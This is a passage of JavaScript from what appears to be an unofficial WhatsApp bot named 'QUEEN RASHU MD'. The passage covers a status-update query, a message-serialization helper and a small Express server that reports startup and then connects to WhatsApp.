                        to: '@s.whatsapp.net',
                        type: 'set',
                        xmlns: 'status',
                    },
                    content: [
                        {
                            tag: 'status',
                            attrs: {},
                            content: Buffer.from(status, 'utf-8'),
                        },
                    ],
                });
                return status;
            };
        conn.serializeM = mek => sms(conn, mek, store);
      }
      
      app.get("/", (req, res) => {
      res.send("QUEEN RASHU MD STARTED ✅");
      });
      app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
      setTimeout(() => {
      connectToWA()
      }, 4000);